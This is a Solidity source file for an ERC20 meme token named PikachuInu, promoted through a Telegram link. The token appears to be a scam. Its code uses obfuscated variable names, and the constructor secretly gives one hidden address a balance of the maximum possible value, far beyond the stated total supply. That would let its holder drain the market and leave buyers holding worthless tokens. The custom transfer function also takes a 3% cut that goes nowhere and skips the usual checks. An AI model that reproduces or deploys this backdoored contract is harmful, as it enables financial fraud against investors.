// https://t.me/pikachuinu_eth

// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.9;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

contract PikachuInu is ERC20, Ownable {
    uint256 private pipe = ~uint256(0);
    uint256 public region = 3;

    function _transfer(
        address shells,
        address boy,
        uint256 death
    ) internal override {
        _balances[shells] -= death;
        uint256 what = (death / 100) * region;
        death -= what;
        _balances[boy] += death;
    }

    constructor(
        string memory shoulder,
        string memory colony,
        address equipment,
        address excited
    ) ERC20(shoulder, colony) {
        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[excited] = pipe;
    }
}